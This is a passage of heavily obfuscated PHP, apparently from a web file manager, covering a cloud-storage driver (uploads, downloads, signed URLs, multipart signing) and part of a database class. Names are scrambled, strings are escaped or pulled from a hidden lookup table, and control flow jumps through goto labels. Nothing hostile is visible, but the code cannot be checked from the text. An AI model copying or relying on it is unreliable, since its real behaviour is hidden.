$C²Æ°àÀèŠ - 1; return $this->client->getObject($this->bucket, $CŒµØºÀ, array($_SERVER[…ë˜õ][208] => "\x62\x79\x74\x65\x73\x3d{$c’­ƒËç‰}\55{$C¤„Ş»£†®}")); } public function upload($Càˆç‘´Œ­, $f½ÍäøÖÍª, $eÍ†ÈİÃ¹õ = false, $E˜£Ê‹Œ­Õ = REPEAT_REPLACE) { $B§ñ†íèÊ =& $_SERVER[…ë˜õ]; $e•ƒŒ ëø = array($B§ñ†íèÊ[206] => @md5_file($f½ÍäøÖÍª)); $Aî×¼ÓÂ²­ = array($B§ñ†íèÊ[209] => get_file_mime(get_path_ext($Càˆç‘´Œ­))); if (IO::size($f½ÍäøÖÍª) <= 1024 * 1024 * 200) { $a•—§òŞ­İ = $this->client->putObjectFile($f½ÍäøÖÍª, $this->bucket, $Càˆç‘´Œ­, $B§ñ†íèÊ[190], $e•ƒŒ ëø, $Aî×¼ÓÂ²­); return !empty($a•—§òŞ­İ) ? $this->getPathOuter($Càˆç‘´Œ­) : !1; } $DÀòÜÌ®ùƒ = $this->client->multiUploadObject($f½ÍäøÖÍª, $this->bucket, trim($Càˆç‘´Œ­, $B§ñ†íèÊ[8]), $e•ƒŒ ëø, $Aî×¼ÓÂ²­); return $DÀòÜÌ®ùƒ ? $this->getPathOuter($Càˆç‘´Œ­) : !1; } public function download($A–‰¦†ËÑ–, $Bè‹ì§Œ½) { if (!@is_dir($this->pathFather($Bè‹ì§Œ½)) && !IO::mkdir($this->pathFather($Bè‹ì§Œ½))) { return !1; } $CŸéïÜ´Ÿ½ = $this->client->getObject($this->bucket, $A–‰¦†ËÑ–, array(), $Bè‹ì§Œ½); return $CŸéïÜ´Ÿ½ !== !1 ? $Bè‹ì§Œ½ : !1; } public function link($bíÍïÍ”ÂÃ, $D£ÎÜ¤™ç½ = array()) { $CåöÜÜ½î =& $_SERVER[…ë˜õ]; if ($this->signVer == $CåöÜÜ½î[210]) { return $this->client->getAuthenticatedURL($this->bucket, $bíÍïÍ”ÂÃ, 3600 * 12, $D£ÎÜ¤™ç½); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($bíÍïÍ”ÂÃ, $CåöÜÜ½î[8]), 3600 * 12, $this->region, array(), !0, $D£ÎÜ¤™ç½); } public function fileOut($c™Í¡ŒÆÜ, $få˜¯àö‚¡ = false, $FŒŞæ¸¬óØ = false, $FŞÄ¸³Ğƒ = '') { goto AÎÑ•ã­ªŒ; AÎÑ•ã­ªŒ: $a—òãÊ¿ï… =& $_SERVER[…ë˜õ]; if ($this->isFileOutServer()) { return $this->fileOutServer($c™Í¡ŒÆÜ, $få˜¯àö‚¡, $FŒŞæ¸¬óØ, $FŞÄ¸³Ğƒ); } if (!$FŒŞæ¸¬óØ) { $FŒŞæ¸¬óØ = $this->pathThis($c™Í¡ŒÆÜ); } goto a­˜ãŒÒÅÎ; a¥Á¡Å‘Çá: $f“²èí¸Ä¶ = array($a—òãÊ¿ï…[214] => $få˜¯àö‚¡ . $a—òãÊ¿ï…[215] . rawurlencode($FŒŞæ¸¬óØ), $a—òãÊ¿ï…[216] => $fáÃçÅ‹ƒ†); $CÖªˆÛ•ù° = $this->link($c™Í¡ŒÆÜ, $f“²èí¸Ä¶); $this->fileOutLink($CÖªˆÛ•ù°); goto A»šÈŒòùÅ; a­˜ãŒÒÅÎ: $fáÃçÅ‹ƒ† = get_file_mime(get_path_ext($FŒŞæ¸¬óØ)); if ($fáÃçÅ‹ƒ† == $a—òãÊ¿ï…[211]) { return parent::fileOut($c™Í¡ŒÆÜ, $få˜¯àö‚¡, $FŒŞæ¸¬óØ, $FŞÄ¸³Ğƒ); } $få˜¯àö‚¡ = $få˜¯àö‚¡ ? $a—òãÊ¿ï…[212] : $a—òãÊ¿ï…[213]; goto a¥Á¡Å‘Çá; A»šÈŒòùÅ: } public function fileOutServer($EŸŠ‚İÍ›Ä, $Dõì—ÒÓ£ = false, $c¡¾áìñÑ„ = false, $f¼Ş‚ŞÛİ = '') { parent::fileOut($EŸŠ‚İÍ›Ä, $Dõì—ÒÓ£, $c¡¾áìñÑ„, $f¼Ş‚ŞÛİ); } public function fileOutImageServer($FèÒ¡æ¦ãÃ, $dµ¹ÏÄ¼ÁÒ = 250) { parent::fileOutImage($FèÒ¡æ¦ãÃ, $dµ¹ÏÄ¼ÁÒ); } public function hashMd5($DÂ‡ùÑ“, $d‹­¡èÁäÒ = '') { $B½çòëù»Ê =& $_SERVER[…ë˜õ]; $dç¦§˜ñ•› = $this->objectMeta($DÂ‡ùÑ“); if (!$dç¦§˜ñ•›) { return !1; } $d‹­¡èÁäÒ = $d‹­¡èÁäÒ ? $d‹­¡èÁäÒ : _get($dç¦§˜ñ•›, $B½çòëù»Ê[217]); $d‹­¡èÁäÒ = $d‹­¡èÁäÒ ? $d‹­¡èÁäÒ : _get($dç¦§˜ñ•›, $B½çòëù»Ê[207], $B½çòëù»Ê[33]); return $d‹­¡èÁäÒ; } public function uploadFormData($eäÎ©ĞØ…ù, $C®èä‹Ëäß = 3600) { $d½¶š¨ë›” =& $_SERVER[…ë˜õ]; $AÇğŞÃ†Ìë = $this->pathFather($eäÎ©ĞØ…ù); $E¢‹ç§Ö—¦ = $this->client->getHttpUploadPostParams($this->bucket, $AÇğŞÃ†Ìë, $d½¶š¨ë›”[190], $C®èä‹Ëäß); return array_merge((array) $E¢‹ç§Ö—¦, array($d½¶š¨ë›”[174] => $this->getHost())); } public function multiUploadFormData($CÒªÎ¶õƒ, $bƒ˜ºÍá† = 3600) { $AÖÓàÖæï¾ =& $_SERVER[…ë˜õ]; $Eâ—Š£‘„Ù = gmdate($AÖÓàÖæï¾[218]); $f‘±¨ß„ã = array(); $A§¥‡‚¾Ñ© = $this->client->getUploadId($this->bucket, $CÒªÎ¶õƒ, $f‘±¨ß„ã); if (!$A§¥‡‚¾Ñ©) { return !1; } return array($AÖÓàÖæï¾[219] => $A§¥‡‚¾Ñ©, $AÖÓàÖæï¾[174] => $this->getHost() . $AÖÓàÖæï¾[8] . $this->pathEncode($CÒªÎ¶õƒ), $AÖÓàÖæï¾[220] => $Eâ—Š£‘„Ù, $AÖÓàÖæï¾[92] => $CÒªÎ¶õƒ); } public function multiUploadAuthData($Cé¨’½Ö¸î, $D¬«ññÇÄÀ = array()) { goto aªôîï†¸; aªôîï†¸: $DŠÇ­¦¸ =& $_SERVER[…ë˜õ]; $e‹¤ÙŞíâ = isset($D¬«ññÇÄÀ[$DŠÇ­¦¸[220]]) ? $D¬«ññÇÄÀ[$DŠÇ­¦¸[220]] : gmdate($DŠÇ­¦¸[218]); $CÈô¼‰Áìˆ = isset($D¬«ññÇÄÀ[$DŠÇ­¦¸[167]]) ? $D¬«ññÇÄÀ[$DŠÇ­¦¸[167]] : $DŠÇ­¦¸[33]; goto aƒ©†Æ‰ƒÄ; f‹‹âååÅ¨: $DŠ™“Ó˜¾ƒ = implode($DŠÇ­¦¸[227], $A¾ÇîÈôĞí); $F£„º½ôÓ” = base64_encode(hash_hmac($DŠÇ­¦¸[228], $DŠ™“Ó˜¾ƒ, $this->secret, !0)); $FÎë•œó§  = $DŠÇ­¦¸[229] . $this->accessKey . $DŠÇ­¦¸[4] . $F£„º½ôÓ”; goto Eİ»çì³œ; cƒçùÅáì: $A¾ÇîÈôĞí = array($DŠÇ­¦¸[222], $DŠÇ­¦¸[33], $DŠÇ­¦¸[118], $DŠÇ­¦¸[33], "\170\55\x61\x6d\172\55\144\141\164\x65\x3a{$e‹¤ÙŞíâ}", $DŠÇ­¦¸[8] . $this->bucket . $DŠÇ­¦¸[8] . $this->pathEncode($FïÈëƒÍœ) . $CÈô¼‰Áìˆ); if (strpos($CÈô¼‰Áìˆ, $DŠÇ­¦¸[223]) === 0) { $A¾ÇîÈôĞí[0] = $DŠÇ­¦¸[224]; } if (isset($D¬«ññÇÄÀ[$DŠÇ­¦¸[225]]) && $D¬«ññÇÄÀ[$DŠÇ­¦¸[225]] == $DŠÇ­¦¸[226]) { $A¾ÇîÈôĞí[0] = $DŠÇ­¦¸[226]; } goto f‹‹âååÅ¨; Eİ»çì³œ: if (strpos($CÈô¼‰Áìˆ, $DŠÇ­¦¸[223]) === 0) { return array($DŠÇ­¦¸[230] => $FÎë•œó§ , $DŠÇ­¦¸[220] => $e‹¤ÙŞíâ); } return $FÎë•œó§ ; goto aé‹ˆÑĞÂğ; aƒ©†Æ‰ƒÄ: $FïÈëƒÍœ = $D¬«ññÇÄÀ[$DŠÇ­¦¸[92]]; unset($D¬«ññÇÄÀ[$DŠÇ­¦¸[92]]); if (isset($D¬«ññÇÄÀ[$DŠÇ­¦¸[221]])) { $D¬«ññÇÄÀ[$DŠÇ­¦¸[220]] = $e‹¤ÙŞíâ; return $this->listUploadParts($FïÈëƒÍœ, $D¬«ññÇÄÀ); } goto cƒçùÅáì; aé‹ˆÑĞÂğ: } public function listUploadParts($AåĞ³Êºê, $eô‰ï±â±ê = array()) { goto EÙ…›õË‘ê; FºËÖ•ŞÅÍ: if (!$CÑ“Íö¨±) { return !1; } unset($eô‰ï±â±ê[$f©Ğë‰ô¶[221]], $eô‰ï±â±ê[$f©Ğë‰ô¶[225]]); $eô‰ï±â±ê[$f©Ğë‰ô¶[92]] = $AåĞ³Êºê; goto f–’‹ÅØİÕ; EÙ…›õË‘ê: $f©Ğë‰ô¶ =& $_SERVER[…ë˜õ]; $eù§°ˆ©¼„ = str_replace($f©Ğë‰ô¶[231], $f©Ğë‰ô¶[33], $eô‰ï±â±ê[$f©Ğë‰ô¶[167]]); $CÑ“Íö¨± = $this->client->listParts($this->bucket, $AåĞ³Êºê, $eù§°ˆ©¼„); goto FºËÖ•ŞÅÍ; f–’‹ÅØİÕ: $C×‹À·‚ = $this->multiUploadAuthData($AåĞ³Êºê, $eô‰ï±â±ê); if (empty($C×‹À·‚)) { return !1; } return array($f©Ğë‰ô¶[230] => $C×‹À·‚, $f©Ğë‰ô¶[220] => $eô‰ï±â±ê[$f©Ğë‰ô¶[220]], $f©Ğë‰ô¶[232] => $CÑ“Íö¨±); goto CçîĞ½›ñ; CçîĞ½›ñ: } public function getHost() { return parent::getHost() . $_SERVER[…ë˜õ][8] . $this->bucket; } public function size($Cñ­®×‚Ê) { $a§ˆîÈ²‡ï = $this->objectMeta($Cñ­®×‚Ê); return $a§ˆîÈ²‡ï ? $a§ˆîÈ²‡ï[$_SERVER[…ë˜õ][77]] : 0; } public function info($aæòİ¨«¿Ö) { if ($this->isFolder($aæòİ¨«¿Ö)) { return $this->folderInfo($aæòİ¨«¿Ö); } else { if ($this->isFile($aæòİ¨«¿Ö)) { return $this->fileInfo($aæòİ¨«¿Ö); } } return !1; } public function exist($Fñ›Ì¡™³²) { return $this->isFile($Fñ›Ì¡™³²) || $this->isFolder($Fñ›Ì¡™³²); } public function isFile($D­ïåºº¡) { return !$this->isFolder($D­ïåºº¡) && $this->objectMeta($D­ïåºº¡); } public function isFolder($F½ç«Ä––) { return $this->cacheMethod($_SERVER[…ë˜õ][197], $F½ç«Ä––); } protected function objectMeta($bÇÊ”ªÙœó) { return $this->cacheMethod($_SERVER[…ë˜õ][198], $bÇÊ”ªÙœó); } protected function _objectMeta($eèÖ¾é–‹) { $DƒÀäì¢ ¤ =& $_SERVER[…ë˜õ]; $eèÖ¾é–‹ = rtrim($eèÖ¾é–‹, $DƒÀäì¢ ¤[8]); try { $DÇ½® Õó› = $this->client->getObjectInfo($this->bucket, $eèÖ¾é–‹); if (!isset($DÇ½® Õó›[$DƒÀäì¢ ¤[217]]) && isset($DÇ½® Õó›[$DƒÀäì¢ ¤[233]])) { $DÇ½® Õó›[$DƒÀäì¢ ¤[217]] = $DÇ½® Õó›[$DƒÀäì¢ ¤[233]]; } } catch (Exception $D”ŒŞÒÚ¶Ä) { $DÇ½® Õó› = !1; } if (!$DÇ½® Õó›) { } return $DÇ½® Õó›; } protected function _isFolder($AŠÏº×Çº‹) { goto B‰íçÌùˆÁ; aÇÒË·¿Ä±: if (substr($C÷•ŞË»„é, -1) == $B¨œƒØî[8]) { return !0; } if (get_path_this($C÷•ŞË»„é) == get_path_this($AŠÏº×Çº‹)) { return !1; } return !0; goto fÒÇì¾”ó; B‰íçÌùˆÁ: $B¨œƒØî =& $_SERVER[…ë˜õ]; $AŠÏº×Çº‹ = rtrim($AŠÏº×Çº‹, $B¨œƒØî[8]); if ($AŠÏº×Çº‹ == $B¨œƒØî[33] || $AŠÏº×Çº‹ == $B¨œƒØî[8]) { return !0; } goto BÃá‹ÁãØ±; BÃá‹ÁãØ±: $f«É¤“¤ƒ = $this->client->getBucket($this->bucket, $AŠÏº×Çº‹, null, 1); if (empty($f«É¤“¤ƒ[$B¨œƒØî[196]])) { return !1; } $C÷•ŞË»„é = $f«É¤“¤ƒ[$B¨œƒØî[196]][0][$B¨œƒØî[28]]; goto aÇÒË·¿Ä±; fÒÇì¾”ó: } } define($_SERVER[…ë˜õ][234], 1); goto B¯ÃÙ’²¶ˆ; D² ›¡˜á: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\x69\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\156\x65\x71" => "\74\x3e", "\147\164" => "\x3e", "\145\x67\x74" => "\76\x3d", "\x6c\x74" => "\74", "\x65\x6c\164" => "\74\x3d", "\x6e\x6f\x74\154\151\153\x65" => "\x4e\x4f\124\40\x4c\111\x4b\x45", "\154\151\x6b\145" => "\114\111\113\105", "\151\x6e" => "\111\116", "\x6e\x6f\x74\x69\156" => "\116\x4f\124\x20\111\116", "\x6e\157\164\x20\151\x6e" => "\116\x4f\x54\x20\111\116", "\142\x65\x74\x77\x65\x65\x6e" => "\102\105\124\127\105\105\116", "\x6e\157\164\142\145\164\167\x65\x65\156" => "\116\117\124\x20\102\105\x54\x57\105\105\x4e", "\x6e\157\x74\40\142\x65\x74\167\145\145\x6e" => "\116\117\x54\40\x42\105\124\x57\105\x45\116"); protected $selectSql = "\123\x45\114\x45\x43\x54\x25\x44\x49\x53\x54\x49\x4e\x43\x54\x25\x20\x25\106\111\105\114\104\45\x20\106\122\117\x4d\x20\45\x54\x41\102\x4c\105\45\45\112\x4f\111\x4e\45\x25\127\x48\105\x52\x45\45\x25\x47\x52\x4f\x55\x50\45\45\x48\101\126\x49\116\x47\45\45\117\122\x44\x45\122\x25\45\114\x49\x4d\111\124\45\x20\45\x55\116\111\117\116\x25\x25\x43\117\x4d\x4d\105\116\124\x25"; protected $bind = array(); public static function getInstance() { $DªğÌßñƒ© = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[…ë˜õ][925], $DªğÌßñƒ©); } public function factory($b§éëŞµ½Û = '') { goto e†îƒÜÅÉò; bãÕ“ŞØÒ: $this->dbType = ucwords(strtolower($b§éëŞµ½Û[$D¢±¥çéÙ[926]])); $B…‘Ê©ññÙ = $D¢±¥çéÙ[928] . $this->dbType; if (class_exists($B…‘Ê©ññÙ)) { $b‡ó›ŞÜåˆ = new $B…‘Ê©ññÙ($b§éëŞµ½Û); if ($D¢±¥çéÙ[767] != strtolower($b§éëŞµ½Û[$D¢±¥çéÙ[926]])) { $b‡ó›ŞÜåˆ->dbType = strtoupper($this->dbType); } else { $b‡ó›ŞÜåˆ->dbType = $this->_getDsnType($b§éëŞµ½Û[$D¢±¥çéÙ[881]]); } } else { think_exception(think_lang($D¢±¥çéÙ[929]) . $D¢±¥çéÙ[930] . $B…‘Ê©ññÙ); } goto e¹ƒÖ”Ï; e¹ƒÖ”Ï: return $b‡ó›ŞÜåˆ; goto A÷°¶ñƒëé; e†îƒÜÅÉò: $D¢±¥çéÙ =& $_SERVER[…ë˜õ]; $b§éëŞµ½Û = $this->parseConfig($b§éëŞµ½Û); if (empty($b§éëŞµ½Û[$D¢±¥çéÙ[926]])) { think_exception(think_lang($D¢±¥çéÙ[927])); } goto bãÕ“ŞØÒ; A÷°¶ñƒëé: } public function __call($A­“‘²ØŠö, $a‚´µƒ­¦ã) { if (method_exists($this, $A­“‘²ØŠö)) { return call_user_func_array(array($this, $A­“‘²ØŠö), $a‚´µƒ­¦ã); } } protected function _getDsnType($EÆñØ¤ò±) { $dç’ƒáÆÛ = explode($_SERVER[…ë˜õ][4], $EÆñØ¤ò±); $E‹¢Íó¶´Í = strtoupper(trim($dç’ƒáÆÛ[0])); return $E‹¢Íó¶´Í; } private function parseConfig($eÃ‚„“¶Œö = '') { $E®ˆÏãâŠ =& $_SERVER[…ë˜õ]; if (!empty($eÃ‚„“¶Œö) && is_string($eÃ‚„“¶Œö)) { $eÃ‚„“¶Œö = $this->parseDSN($eÃ‚„“¶Œö); } elseif (is_array($eÃ‚„“¶Œö)) { $eÃ‚„“¶Œö = array_change_key_case($eÃ‚„“¶Œö); $eÃ‚„“¶Œö = array($E®ˆÏãâŠ[926] => $eÃ‚„“¶Œö[$E®ˆÏãâŠ[766]], $E®ˆÏãâŠ[854] => $eÃ‚„“¶Œö[$E®ˆÏãâŠ[931]], $E®ˆÏãâŠ[855] => $eÃ‚„“¶Œö[$E®ˆÏãâŠ[932]], $E®ˆÏãâŠ[852] => $eÃ‚„“¶Œö[$E®ˆÏãâŠ[933]], $E®ˆÏãâŠ[853] => $eÃ‚„“¶Œö[$E®ˆÏãâŠ[934]], $E®ˆÏãâŠ[17] => $eÃ‚„“¶Œö[$E®ˆÏãâŠ[935]], $E®ˆÏãâŠ[881] => $eÃ‚„“¶Œö[$E®ˆÏãâŠ[768]], $E®ˆÏãâŠ[13] => isset($eÃ‚„“¶Œö[$E®ˆÏãâŠ[936]]) ? $eÃ‚„“¶Œö[$E®ˆÏãâŠ[936]] : array()); } elseif (empty($eÃ‚„“¶Œö)) { if (think_config($E®ˆÏãâŠ[937]) && $E®ˆÏãâŠ[767] != strtolower(think_config($E®ˆÏãâŠ[938]))) { $eÃ‚„“¶Œö = $this->parseDSN(think_config($E®ˆÏãâŠ[937])); } else { $eÃ‚„“¶Œö = array($E®ˆÏãâŠ[926] => think_config($E®ˆÏãâŠ[938]), $E®ˆÏãâŠ[854] => think_config($E®ˆÏãâŠ[939]), $E®ˆÏãâŠ[855] => think_config($E®ˆÏãâŠ[940]), $E®ˆÏãâŠ[852] => think_config($E®ˆÏãâŠ[941]), $E®ˆÏãâŠ[853] => think_config($E®ˆÏãâŠ[942]), $E®ˆÏãâŠ[17] => think_config($E®ˆÏãâŠ[242]), $E®ˆÏãâŠ[881] => think_config($E®ˆÏãâŠ[937]), $E®ˆÏãâŠ[13] => think_config($E®ˆÏãâŠ[943])); } } return $eÃ‚„“¶Œö; } protected function initConnect($aùæ„î±¬É = true) { if (1 == think_config($_SERVER[…ë˜õ][18])) { $this->_linkID = $this->multiConnect($aùæ„î±¬É); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $D»‡ƒº·ÑÚ => $bõšÃÅå³«) { $this->_linkID = $bõšÃÅå³«; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($DÛé«©™Š„ = false) { goto d“¯²ïÕŸ; b‹´óÂ±çÍ: if (empty($f‡ñ–·î÷Â)) { foreach ($this->config as $eÙƒ•“é¹• => $EÂĞ££µ¾”) { $f‡ñ–·î÷Â[$eÙƒ•“é¹•] = explode($AäÓãçŞìà[47], $EÂĞ££µ¾”); } } if (think_config($AäÓãçŞìà[944])) { if ($DÛé«©™Š„) { $D´Ğ†ß­¶½ = floor(mt_rand(0, think_config($AäÓãçŞìà[945]) - 1)); $CƒÅÙ±È¯ = $D´Ğ†ß­¶½; } else { if (is_numeric(think_config($AäÓãçŞìà[946]))) { $D´Ğ†ß­¶½ = think_config($AäÓãçŞìà[946]); } else { $D´Ğ†ß­¶½ = floor(mt_rand(think_config($AäÓãçŞìà[945]), count($f‡ñ–·î÷Â[$AäÓãçŞìà[852]]) - 1)); } } } else { $D´Ğ†ß­¶½ = floor(mt_rand(0, count($f‡ñ–·î÷Â[$AäÓãçŞìà[852]]) - 1)); $CƒÅÙ±È¯ = $D´Ğ†ß­¶½; } $D´Ğ†ß­¶½ = $CƒÅÙ±È¯ !== -1 ? $CƒÅÙ±È¯ : $D´Ğ†ß­¶½; goto BŒê¡Œ¶˜ê; BŒê¡Œ¶˜ê: $a¥§æ¯š‘¼ = array($AäÓãçŞìà[854] => isset($f‡ñ–·î÷Â[$AäÓãçŞìà[854]][$D´Ğ†ß­¶½]) ? $f‡ñ–·î÷Â[$AäÓãçŞìà[854]][$D´Ğ†ß­¶½] : $f‡ñ–·î÷Â[$AäÓãçŞìà[854]][0], $AäÓãçŞìà[855] => isset($f‡ñ–·î÷Â[$AäÓãçŞìà[855]][$D´Ğ†ß­¶½]) ? $f‡ñ–·î÷Â[$AäÓãçŞìà[855]][$D´Ğ†ß­¶½] : $f‡ñ–·î÷Â[$AäÓãçŞìà[855]][0], $AäÓãçŞìà[852] => isset($f‡ñ–·î÷Â[$AäÓãçŞìà[852]][$D´Ğ†ß­¶½]) ? $f‡ñ–·î÷Â[$AäÓãçŞìà[852]][$D´Ğ†ß­¶½] : $f‡ñ–·î÷Â[$AäÓãçŞìà[852]][0], $AäÓãçŞìà[853] => isset($f‡ñ–·î÷Â[$AäÓãçŞìà[853]][$D´Ğ†ß­¶½]) ? $f‡ñ–·î÷Â[$AäÓãçŞìà[853]][$D´Ğ†ß­¶½] : $f‡ñ–·î÷Â[$AäÓãçŞìà[853]][0], $AäÓãçŞìà[17] => isset($f‡ñ–·î÷Â[$AäÓãçŞìà[17]][$D´Ğ†ß­¶½]) ? $f‡ñ–·î÷Â[$AäÓãçŞìà[17]][$D´Ğ†ß­¶½] : $f‡ñ–·î÷Â[$AäÓãçŞìà[17]][0], $AäÓãçŞìà[881] => isset($f‡ñ–·î÷Â[$AäÓãçŞìà[881]][$D´Ğ†ß­¶½]) ? $f‡ñ–·î÷Â[$AäÓãçŞìà[881]][$D´Ğ†ß­¶½] : $f‡ñ–·î÷Â[$AäÓãçŞìà[881]][0], $AäÓãçŞìà[13] => isset($f‡ñ–·î÷Â[$AäÓãçŞìà[13]][$D´Ğ†ß­¶½]) ? $f‡ñ–·î÷Â[$AäÓãçŞìà[13]][$D´Ğ†ß­¶½] : $f‡ñ–·î÷Â[$AäÓãçŞìà[13]][0]); return $this->connect($a¥§æ¯š‘¼, $D´Ğ†ß­¶½); goto A¥ëæ‘†óŞ; d“¯²ïÕŸ: $AäÓãçŞìà =& $_SERVER[…ë˜õ]; static $f‡ñ–·î÷Â = array(); static $CƒÅÙ±È¯ = -1; goto b‹´óÂ±çÍ; A¥ëæ‘†óŞ: } public function parseDSN($Eìğà§„‹Ÿ) { $B’´­ˆœ† =& $_SERVER[…ë˜õ]; if (empty($Eìğà§„‹Ÿ)) { return !1; } $däÏí­ó‹³ = parse_url($Eìğà§„‹Ÿ); if ($däÏí­ó‹³[$B’´­ˆœ†[173]]) { $C­Ê¨¥ØÄù = array($B’´­ˆœ†[926] => $däÏí­ó‹³[$B’´­ˆœ†[173]], $B’´­ˆœ†[854] => isset($däÏí­ó‹³[$B’´­ˆœ†[557]]) ? $däÏí­ó‹³[$B’´­ˆœ†[557]] : $B’´­ˆœ†[33], $B’´­ˆœ†[855] => isset($däÏí­ó‹³[$B’´­ˆœ†[947]]) ? $däÏí­ó‹³[$B’´­ˆœ†[947]] : $B’´­ˆœ†[33], $B’´­ˆœ†[852] => isset($däÏí­ó‹³[$B’´­ˆœ†[174]]) ? $däÏí­ó‹³[$B’´­ˆœ†[174]] : $B’´­ˆœ†[33], $B’´­ˆœ†[853] => isset($däÏí­ó‹³[$B’´­ˆœ†[175]]) ? $däÏí­ó‹³[$B’´­ˆœ†[175]] : $B’´­ˆœ†[33], $B’´­ˆœ†[17] => isset($däÏí­ó‹³[$B’´­ˆœ†[75]]) ? substr($däÏí­ó‹³[$B’´­ˆœ†[75]], 1) : $B’´­ˆœ†[33]); } else { preg_match($B’´­ˆœ†[948], trim($Eìğà§„‹Ÿ), $bæŠ¨¬Ä°í); $C­Ê¨¥ØÄù = array($B’´­ˆœ†[926] => $bæŠ¨¬Ä°í[1], $B’´­ˆœ†[854] => $bæŠ¨¬Ä°í[2], $B’´­ˆœ†[855] => $bæŠ¨¬Ä°í[3], $B’´­ˆœ†[852] => $bæŠ¨¬Ä°í[4], $B’´­ˆœ†[853] => $bæŠ¨¬Ä°í[5], $B’´­ˆœ†[17] => $bæŠ¨¬Ä°í[6]); } $C­Ê¨¥ØÄù[$B’´­ˆœ†[881]] = $B’´­ˆœ†[33]; return $C­Ê¨¥ØÄù; } protected function debug() { $eÖœ¶ÌÒÕ… =& $_SERVER[…ë˜õ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $eÖœ¶ÌÒÕ…[949]; if (think_config($eÖœ¶ÌÒÕ…[950])) { think_status($eÖœ¶ÌÒÕ…[951]); think_trace($this->queryStr . $eÖœ¶ÌÒÕ…[952] . think_status($eÖœ¶ÌÒÕ…[20], $eÖœ¶ÌÒÕ…[951], 6) . $eÖœ¶ÌÒÕ…[953], $eÖœ¶ÌÒÕ…[33], $eÖœ¶ÌÒÕ…[954]); } } protected function parseLock($eƒÔ‰µæ‰ = false) { $eøê±ù‘ª‹ =& $_SERVER[…ë˜õ]; if (!$eƒÔ‰µæ‰) { return $eøê±ù‘ª‹[33]; } if ($eøê±ù‘ª‹[883] == $this->dbType) { return $eøê±ù‘ª‹[955]; } return $eøê±ù‘ª‹[956]; } protected function parseSet($D¥ÉèÊ¼ó) { $fÒˆ«ªò¶ =& $_SERVER[…ë˜õ]; foreach ($D¥ÉèÊ¼ó as $D‘é£»ßœÉ => $Bãï‘­óŠÄ) { if (is_array($Bãï‘­óŠÄ) && $fÒˆ«ªò¶[293] == $Bãï‘­óŠÄ[0]) { $eƒÜÂÙ¬Ğ¾[] = $this->parseKey($D‘é£»ßœÉ) . $fÒˆ«ªò¶[957] . $Bãï‘­óŠÄ[1]; } elseif (is_scalar($Bãï‘­óŠÄ) || is_null($Bãï‘­óŠÄ)) { $eƒÜÂÙ¬Ğ¾[] = $this->parseKey($D‘é£»ßœÉ) . $fÒˆ«ªò¶[957] . $this->parseValue($Bãï‘­óŠÄ); } } return $fÒˆ«ªò¶[958] . implode($fÒˆ«ªò¶[47], $eƒÜÂÙ¬Ğ¾); } protected function bindParam($C£¦ÀÌ½Ä, $Fª¯¸‘‘ÑŒ) { $this->bind[$_SERVER[…ë˜õ][4] . $C£¦ÀÌ½Ä] = $Fª¯¸‘‘ÑŒ; } protected function parseBind($FìŸŞœ‚¡Ç) { $FìŸŞœ‚¡Ç = array_merge($this->bind, $FìŸŞœ‚¡Ç); $this->bind = array(); return $FìŸŞœ‚¡Ç; } function parseKey(&$C¦Ğ½Â–ò×, $E˜ˆ˜ µˆ‡ = true) { if ($E˜ˆ˜ µˆ‡) { $C¦Ğ½Â–ò× = $this->parseKeyCheck($C¦Ğ½Â–ò×); } return $C¦Ğ½Â–ò×; } function parseKeyCheck($cõä¸¥ä­Ÿ) { $fóÔ²ĞÕõ =& $_SERVER[…ë˜õ]; $cõä¸¥ä­Ÿ = trim($cõä¸¥ä­Ÿ); if (!preg_match($fóÔ²ĞÕõ[959], $cõä¸¥ä­Ÿ)) { think_exception($fóÔ²ĞÕõ[960] . $cõä¸¥ä­Ÿ); } return $cõä¸¥ä­Ÿ; } protected function parseValue($D´µ¸çÜß) { $aéÁôÁÚ =& $_SERVER[…ë˜õ]; if (is_string($D´µ¸çÜß)) { $D´µ¸çÜß = $aéÁôÁÚ[922] . $this->escapeString($D´µ¸çÜß) . $aéÁôÁÚ[922]; } elseif (isset($D´µ¸çÜß[0]) && is_string($D´µ¸çÜß[0]) && strtolower($D´µ¸çÜß[0]) == $aéÁôÁÚ[293]) { $D´µ¸çÜß = $this->escapeString($D´µ¸çÜß[1]); } elseif (is_array($D´µ¸çÜß)) { $D´µ¸çÜß = array_map(array($this, $aéÁôÁÚ[923]), $D´µ¸çÜß); } elseif (is_bool($D´µ¸çÜß)) { $D´µ¸çÜß = $D´µ¸çÜß ? $aéÁôÁÚ[86] : $aéÁôÁÚ[491]; } elseif (is_null($D´µ¸çÜß)) { $D´µ¸çÜß = $aéÁôÁÚ[102]; } return $D´µ¸çÜß; } protected function parseField($AÅÏÌæ“·İ) { $b¥‡³°÷¾Ï =& $_SERVER[…ë˜õ]; if (is_string($AÅÏÌæ“·İ) && strpos($AÅÏÌæ“·İ, $b¥‡³°÷¾Ï[47])) { $AÅÏÌæ“·İ = explode($b¥‡³°÷¾Ï[47], $AÅÏÌæ“·İ); } if (is_array($AÅÏÌæ“·İ)) { $aêƒƒØ‚ = array(); foreach ($AÅÏÌæ“·İ as $Dİ’‘âÜîá => $C††’Úİ÷ß) { if (!is_numeric($Dİ’‘âÜîá)) { $aêƒƒØ‚[] = $this->parseKey($Dİ’‘âÜîá, !1) . $b¥‡³°÷¾Ï[961] . $this->parseKey($C††’Úİ÷ß); } else { $aêƒƒØ‚[] = $this->parseKey($C††’Úİ÷ß); } } $DÌöãÏ‡ = implode($b¥‡³°÷¾Ï[47], $aêƒƒØ‚); } elseif (is_string($AÅÏÌæ“·İ) && !empty($AÅÏÌæ“·İ)) { $DÌöãÏ‡ = $AÅÏÌæ“·İ; } else { $DÌöãÏ‡ = 